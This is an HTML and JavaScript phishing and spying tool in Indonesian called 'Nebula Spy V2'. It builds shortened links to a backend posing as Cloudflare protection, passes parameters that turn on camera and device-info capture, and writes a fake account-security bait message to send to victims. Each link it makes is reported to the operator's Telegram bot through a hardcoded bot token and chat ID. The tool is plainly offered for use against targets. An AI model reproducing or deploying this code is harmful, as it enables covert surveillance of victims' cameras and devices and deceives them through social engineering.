<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <title>𝕷𝕻𝖃 SPY V2 - Nebula Edition</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    @font-face {
      font-family: 'Poppins';
      font-style: normal;
      font-weight: 400;
      font-display: swap;
      src: url(https://fonts.gstatic.com/s/poppins/v24/pxiEyp8kv8JHgFVrFJA.ttf) format('truetype');
    }

    :root {
      --container-bg: rgba(10, 2, 20, 0.9);
      --accent: #bc13fe; 
      --accent-soft: #f0abff;
      --input-bg: rgba(25, 5, 45, 0.8);
      --text-soft: #e0d1ff;
      --nebula-gradient: linear-gradient(135deg, #7a12ff, #bc13fe);
      --nebula-glow: rgba(188, 19, 254, 0.5);
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: "Poppins", sans-serif;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #05010a;
      background-image: radial-gradient(circle at center, #1a052e 0%, #05010a 100%);
    }

    .container {
      width: 100%;
      max-width: 480px;
      background: var(--container-bg);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 0 30px var(--nebula-glow);
      border: 1px solid rgba(188, 19, 254, 0.3);
      backdrop-filter: blur(15px);
      text-align: center;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: var(--accent-soft);
      text-transform: uppercase;
      letter-spacing: 2px;
    }

    .form-group { margin-bottom: 15px; text-align: left; }
    label { display: block; font-size: 13px; color: #d8b4ff; margin-bottom: 5px; margin-left: 5px; }

    input {
      width: 100%; padding: 12px; border-radius: 10px;
      border: 1px solid rgba(188, 19, 254, 0.3);
      background: var(--input-bg);
      color: #fff;
      outline: none;
      transition: 0.3s;
    }
    input:focus { border-color: var(--accent); box-shadow: 0 0 10px var(--nebula-glow); }

    button {
      width: 100%; padding: 12px; border-radius: 10px; border: none;
      background: var(--nebula-gradient);
      color: #fff; font-weight: 700; cursor: pointer;
      margin-top: 10px; transition: 0.3s;
    }
    button:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--nebula-glow); }

    .result-box {
      margin-top: 20px; padding: 15px;
      background: rgba(0, 0, 0, 0.4);
      border-radius: 12px; border: 1px solid var(--accent);
      display: none;
    }

    #spyLink { color: #00d9ff; font-weight: bold; word-break: break-all; text-decoration: none; }
    
    .bait-area {
      margin-top: 15px; background: #1a052e; 
      padding: 10px; border-radius: 8px; font-size: 12px;
      color: #ccc; border: 1px solid #333; text-align: left;
    }

    .hidden { display: none; }
    .status { font-size: 11px; margin-top: 5px; color: #00ffcc; opacity: 0.8; }
  </style>
</head>
<body>

  <div class="container" id="loginPage">
    <h2>Access Control</h2>
    <div class="form-group">
      <input id="username" type="text" placeholder="Username">
    </div>
    <div class="form-group">
      <input id="password" type="password" placeholder="Password">
    </div>
    <button onclick="login()">OTENTIKASI</button>
  </div>

  <div class="container hidden" id="mainPage">
    <h2>NEBULA SPY V2</h2>
    
    <div class="form-group">
      <label>Target URL (Tujuan Setelah Klik)</label>
      <input id="urlTarget" type="text" placeholder="https://facebook.com/login">
    </div>

    <button id="btnGen" onclick="generateLink()">GENERATE SPY LINK</button>

    <div class="result-box" id="resultDiv">
      <p style="font-size: 13px; margin-bottom: 5px;">Kirim Link Ini ke Target:</p>
      <a id="spyLink" href="#" target="_blank"></a>
      
      <div class="bait-area">
        <strong>Pesan Umpan (Salin):</strong><br>
        <span id="baitText"></span>
      </div>
      
      <button onclick="copyLink()" style="background: #333; font-size: 12px;">Salin Link</button>
      <p class="status" id="copyStatus"></p>
    </div>
    
    <button onclick="location.reload()" style="background: transparent; border: 1px solid #444; margin-top: 20px; font-size: 11px;">LOGOUT</button>
  </div>

  <script>
    // DATA CONFIGURATION
    const CONFIG = {
      token: "8617398870:AAHHVz0unYAW1pt75b-jo3AGhAxIxsWu47Q",
      chatId: "8213510319",
      backend: "https://cloudflareprotect.vercel.app",
      user: "bau",
      pass: "peler"
    };

    function login() {
      const u = document.getElementById('username').value;
      const p = document.getElementById('password').value;
      if(u === CONFIG.user && p === CONFIG.pass) {
        document.getElementById('loginPage').classList.add('hidden');
        document.getElementById('mainPage').classList.remove('hidden');
      } else {
        alert("Akses Ditolak!");
      }
    }

    async function generateLink() {
      const target = document.getElementById('urlTarget').value;
      const btn = document.getElementById('btnGen');
      
      if(!target) return alert("Isi URL Target!");

      btn.innerText = "PROCESSING...";
      
      // Menyiapkan Payload Params
      const finalUrl = `${CONFIG.backend}?token=${CONFIG.token}&chat=${CONFIG.chatId}&target=${encodeURIComponent(target)}&cam=true&info=true`;
      
      try {
        const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(finalUrl)}`);
        const shortUrl = await response.text();

        // Tampilkan Hasil
        document.getElementById('resultDiv').style.display = 'block';
        document.getElementById('spyLink').innerText = shortUrl;
        document.getElementById('spyLink').href = shortUrl;
        
        // Buat Pesan Umpan Otomatis
        const bait = `⚠️ Keamanan Akun: Seseorang mencoba login ke akun Anda. Jika itu bukan Anda, segera amankan akun melalui enkripsi Cloudflare berikut: ${shortUrl}`;
        document.getElementById('baitText').innerText = bait;

        // Kirim Log ke Telegram Pembuat
        sendTele(`🚀 *LINK TERBUAT!*\n\nTarget: ${target}\nLink: ${shortUrl}\nStatus: Camera & Info Active`);
        
        btn.innerText = "GENERATE SPY LINK";
      } catch (err) {
        alert("Gagal membuat link.");
        btn.innerText = "GENERATE SPY LINK";
      }
    }

    function sendTele(msg) {
      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    }

    function copyLink() {
      const link = document.getElementById('spyLink').innerText;
      navigator.clipboard.writeText(link);
      const st = document.getElementById('copyStatus');
      st.innerText = "Link tersalin ke clipboard!";
      setTimeout(() => { st.innerText = ""; }, 2000);
    }
  </script>
</body>
</html>
